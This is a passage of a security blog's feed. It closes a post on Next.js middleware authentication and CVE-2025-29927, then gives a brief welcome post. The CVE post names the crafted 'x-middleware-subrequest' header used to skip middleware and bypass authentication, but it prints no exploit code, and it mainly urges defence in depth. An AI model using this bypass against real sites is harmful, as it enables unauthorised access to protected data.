  <li><strong>Apply basic tenant-aware routing</strong></li>
</ul>

<p>But the real enforcement should happen deeper:</p>

<ul>
  <li><strong>Don’t check roles or permissions here</strong></li>
  <li><strong>Don’t make critical auth decisions</strong> based only on this layer</li>
</ul>

<p>Instead, <strong>put your fine-grained logic</strong> on the server side — RBAC, ABAC, tenant isolation — <strong>inside your API routes or backend logic</strong>.</p>

<h2 id="lessons-from-cve-2025-29927">Lessons from CVE-2025-29927</h2>

<p>The flaw that triggered this debate didn’t involve tricky encoding or exotic Unicode behavior to bypass route matches. It was much simpler: by crafting a request with a specific HTTP header (<code class="language-plaintext highlighter-rouge">x-middleware-subrequest</code>), attackers could trick the server into skipping middleware entirely — and bypass authentication logic that only lived there.</p>

<p>It’s a classic case of trusting the wrong layer.</p>

<blockquote>
  <p><strong>If one bypass breaks your security, you didn’t have security. You had hope.</strong></p>
</blockquote>

<p>Here’s how to build for reality:</p>

<ul>
  <li><strong>Defend in depth</strong> — don’t make any single layer your only layer.</li>
  <li><strong>Authorize where it counts</strong> — at the point of data access, in your APIs.</li>
</ul>

<h2 id="final-thoughts">Final Thoughts</h2>

<p>CVE-2025-29927 isn’t the first middleware bypass — and it likely won’t be the last. That doesn’t mean middleware auth in Next.js is useless. Far from it.</p>

<p>Edge-based middleware is still a great place for coarse-grained controls. It can improve UX. It can help performance. It can offload basic gating logic.</p>

<p>But <span class="underline">it can’t be your only line of defense.</span></p>

<p>Use edge middleware wisely, as a first-pass filter, not your final gatekeeper. Build layers. Validate everywhere. And expect failure.</p>

<p>Because someone out there is already crafting the next bypass.</p>]]></content><author><name></name></author><category term="Next.js" /><category term="middleware" /><category term="authentication" /><summary type="html"><![CDATA[CVE-2025-29927]]></summary></entry><entry><title type="html">Hello World.</title><link href="http://localhost:4000/first/introduction/2025/03/28/Welcome-To-The-Blog.html" rel="alternate" type="text/html" title="Hello World." /><published>2025-03-28T10:00:00+02:00</published><updated>2025-03-28T10:00:00+02:00</updated><id>http://localhost:4000/first/introduction/2025/03/28/Welcome-To-The-Blog</id><content type="html" xml:base="http://localhost:4000/first/introduction/2025/03/28/Welcome-To-The-Blog.html"><![CDATA[<h1 id="welcome-to-darkforge-labs">Welcome to DarkForge Labs</h1>

<p>We’re a team of security engineers, hackers, and builders obsessed with solving problems in cybersecurity. At DarkForge Labs, we don’t just find threats, we dismantle them.</p>

<p>This blog is where we’ll share sharp, technical insights, real-world exploit breakdowns, research deep dives, and a behind-the-scenes look at how we defend the edge.</p>

<p>Whether you’re red team, blue team, or somewhere in between—pull up a chair. It’s about to get interesting.</p>

<p>Stay sharp.</p>

<p>– DarkForge Labs</p>]]></content><author><name></name></author><category term="first" /><category term="introduction" /><summary type="html"><![CDATA[Welcome to DarkForge Labs]]></summary></entry></feed>